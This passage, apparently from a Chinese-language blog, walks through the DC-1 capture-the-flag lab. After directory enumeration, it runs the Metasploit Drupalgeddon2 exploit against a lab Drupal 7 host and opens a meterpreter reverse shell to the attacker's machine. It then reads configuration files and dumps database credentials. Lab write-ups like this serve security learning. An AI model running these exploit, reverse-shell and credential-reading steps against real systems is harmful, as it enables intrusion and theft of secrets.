(CODE:200|SIZE:18092)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/misc/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/modules/                             </span><br><span class="line">+ http://192.168.1.3/node (CODE:200|SIZE:7564)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/profiles/                               </span><br><span class="line">+ http://192.168.1.3/README (CODE:200|SIZE:5376)                     </span><br><span class="line">+ http://192.168.1.3/robots (CODE:200|SIZE:1561)                       </span><br><span class="line">+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1561)                     </span><br><span class="line">+ http://192.168.1.3/Root (CODE:403|SIZE:283)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/scripts/                               </span><br><span class="line">+ http://192.168.1.3/search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/Search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/server-status (CODE:403|SIZE:292)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/sites/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/themes/                               </span><br><span class="line">+ http://192.168.1.3/user (CODE:200|SIZE:7417)                         </span><br><span class="line">+ http://192.168.1.3/web.config (CODE:200|SIZE:2178)                     </span><br><span class="line">+ http://192.168.1.3/xmlrpc.php (CODE:200|SIZE:42)     </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>访问一下可以发现UPGRADE.txt</code></p><img src="/2020/08/21/DC-1/image-20200820200917231.png"><p><code>访问UPGRADE.txt，可以发现此cms的版本为7.x</code></p><img src="/2020/08/21/DC-1/image-20200820201127217.png"><p><code>百度一下发现存在RCE漏洞</code></p><img src="/2020/08/21/DC-1/image-20200820204120867.png"><h2 id="0x05-get-shell"><a href="#0x05-get-shell" class="headerlink" title="0x05.get shell"></a>0x05.get shell</h2><h3 id="1-msf一把梭的我直接msf"><a href="#1-msf一把梭的我直接msf" class="headerlink" title="1.msf一把梭的我直接msf"></a>1.msf一把梭的我直接msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># msfconsole -q</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index, <span class="keyword">for</span> example use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span><br><span class="line"></span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure><h3 id="2-由于是18年的洞所以使用第四个API注入，直接拿到meterpreter-shell"><a href="#2-由于是18年的洞所以使用第四个API注入，直接拿到meterpreter-shell" class="headerlink" title="2.由于是18年的洞所以使用第四个API注入，直接拿到meterpreter shell"></a>2.由于是18年的洞所以使用第四个API注入，直接拿到meterpreter shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">     Module: exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">   Platform: PHP, Unix, Linux</span><br><span class="line">       Arch: php, cmd, x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2018-03-28</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Jasper Mattsson</span><br><span class="line">  a2u</span><br><span class="line">  Nixawk</span><br><span class="line">  FireFart</span><br><span class="line">  wvu &lt;wvu@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic (PHP In-Memory)</span><br><span class="line">  1   Automatic (PHP Dropper)</span><br><span class="line">  2   Automatic (Unix In-Memory)</span><br><span class="line">  3   Automatic (Linux Dropper)</span><br><span class="line">  4   Drupal 7.x (PHP In-Memory)</span><br><span class="line">  5   Drupal 7.x (PHP Dropper)</span><br><span class="line">  6   Drupal 7.x (Unix In-Memory)</span><br><span class="line">  7   Drupal 7.x (Linux Dropper)</span><br><span class="line">  8   Drupal 8.x (PHP In-Memory)</span><br><span class="line">  9   Drupal 8.x (PHP Dropper)</span><br><span class="line">  10  Drupal 8.x (Unix In-Memory)</span><br><span class="line">  11  Drupal 8.x (Linux Dropper)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name         Current Setting  Required  Description</span><br><span class="line">  ----         ---------------  --------  -----------</span><br><span class="line">  DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">  PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">  Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT        80               yes       The target port (TCP)</span><br><span class="line">  SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">  TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">  VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Avoid: 3 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a Drupal property injection <span class="keyword">in</span> the Forms API. </span><br><span class="line">  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are </span><br><span class="line">  vulnerable.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2018-7600/</span><br><span class="line">  https://www.drupal.org/sa-core-2018-002</span><br><span class="line">  https://greysec.net/showthread.php?tid=2912</span><br><span class="line">  https://research.checkpoint.com/uncovering-drupalgeddon-2/</span><br><span class="line">  https://github.com/a2u/CVE-2018-7600</span><br><span class="line">  https://github.com/nixawk/labs/issues/19</span><br><span class="line">  https://github.com/FireFart/CVE-2018-7600</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  SA-CORE-2018-002</span><br><span class="line">  Drupalgeddon 2</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhosts 192.168.1.3</span><br><span class="line">rhosts =&gt; 192.168.1.3</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> lhost 192.168.1.6</span><br><span class="line">lhost =&gt; 192.168.1.6</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                      <span class="built_in">set</span> payload php/bind_php                        <span class="built_in">set</span> payload php/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp              <span class="built_in">set</span> payload php/bind_php_ipv6                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp           <span class="built_in">set</span> payload php/download_exec                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_http      <span class="built_in">set</span> payload php/<span class="built_in">exec</span>                            <span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_https     <span class="built_in">set</span> payload php/meterpreter/bind_tcp            <span class="built_in">set</span> payload php/reverse_perl</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl                       <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6       <span class="built_in">set</span> payload php/reverse_php</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl_ipv6                  <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6_uuid  </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.3:52082) at 2020-08-20 08:50:40 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="3-查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃"><a href="#3-查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃" class="headerlink" title="3.查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃"></a>3.查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: getsystem.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>由于要找到5个flag所以还是先查看一下文件</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess</span><br><span class="line">100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt</span><br><span class="line">100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt</span><br><span class="line">100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt</span><br><span class="line">100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt</span><br><span class="line">100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt</span><br><span class="line">100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt</span><br><span class="line">100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php</span><br><span class="line">100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php</span><br><span class="line">100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes</span><br><span class="line">100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php</span><br><span class="line">100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles</span><br><span class="line">100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  scripts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes</span><br><span class="line">100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php</span><br><span class="line">100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config</span><br><span class="line">100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="4-发现flag1-txt，看看有没有权限看"><a href="#4-发现flag1-txt，看看有没有权限看" class="headerlink" title="4.发现flag1.txt，看看有没有权限看"></a>4.发现flag1.txt，看看有没有权限看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>看是能看，霸特下一个flag在哪？？？根据提示，每一个好的cms需要一个配置文件，你也是。。。😥</code></p><p><code>查看网站配置文件，是一个xml文件，啥也没有！</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat web.config</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;!-- Don<span class="string">&#x27;t show directory listings for URLs which map to a directory. --&gt;</span></span><br><span class="line"><span class="string">    &lt;directoryBrowse enabled=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;rewrite&gt;</span></span><br><span class="line"><span class="string">      &lt;rules&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Protect files and directories from prying eyes&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template)$&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;403&quot; subStatusCode=&quot;0&quot; statusReason=&quot;Forbidden&quot; statusDescription=&quot;Access is forbidden.&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Force simple error message for requests for non-existent favicon.ico&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;favicon\.ico&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;404&quot; subStatusCode=&quot;1&quot; statusReason=&quot;File Not Found&quot; statusDescription=&quot;The requested file favicon.ico was not found&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- Rewrite URLs of the form &#x27;</span>x<span class="string">&#x27; to the form &#x27;</span>index.php?q=x<span class="string">&#x27;. --&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Short URLs&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;^(.*)$&quot; ignoreCase=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;URL&#125;&quot; pattern=&quot;^/favicon.ico$&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;Rewrite&quot; url=&quot;index.php?q=&#123;R:1&#125;&quot; appendQueryString=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">      &lt;/rules&gt;</span></span><br><span class="line"><span class="string">    &lt;/rewrite&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;httpErrors&gt;</span></span><br><span class="line"><span class="string">      &lt;remove statusCode=&quot;404&quot; subStatusCode=&quot;-1&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;error statusCode=&quot;404&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;/index.php&quot; responseMode=&quot;ExecuteURL&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/httpErrors&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;defaultDocument&gt;</span></span><br><span class="line"><span class="string">      &lt;!-- Set the default document --&gt;</span></span><br><span class="line"><span class="string">      &lt;files&gt;</span></span><br><span class="line"><span class="string">        &lt;remove value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;add value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/files&gt;</span></span><br><span class="line"><span class="string">    &lt;/defaultDocument&gt;</span></span><br><span class="line"><span class="string">  &lt;/system.webServer&gt;</span></span><br><span class="line"><span class="string">&lt;/configuration&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; </span></span><br></pre></td></tr></table></figure><p><code>换个思路，竟然是web application那就有数据库，那么数据库的密码是以明文的方式写在配置文件中</code></p><p><code>一番苦逼的查找，他在sites/default/settings.php中</code></p><p><code>并且也看到了flag2与提示信息，内容为：暴力破解与目录攻击不是你访问系统的唯一途径，但是你可以尝试一下</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren<span class="string">&#x27;t the</span></span><br><span class="line"><span class="string"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="string"> * What can you do with these credentials?</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$databases = array (</span></span><br><span class="line"><span class="string">  &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">  array (</span></span><br><span class="line"><span class="string">    &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">    array (</span></span><br><span class="line"><span class="string">      &#x27;</span>database<span class="string">&#x27; =&gt; &#x27;</span>drupaldb<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>username<span class="string">&#x27; =&gt; &#x27;</span>dbuser<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>password<span class="string">&#x27; =&gt; &#x27;</span>R0ck3t<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>host<span class="string">&#x27; =&gt; &#x27;</span>localhost<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>port<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>driver<span class="string">&#x27; =&gt; &#x27;</span>mysql<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>prefix<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    ),</span></span><br><span class="line"><span class="string">  ),</span></span><br><span class="line"><span class="string">);</span></span><br></pre></td></tr></table></figure><h2 id="0x06-登入数据库"><a href="#0x06-登入数据库" class="headerlink" 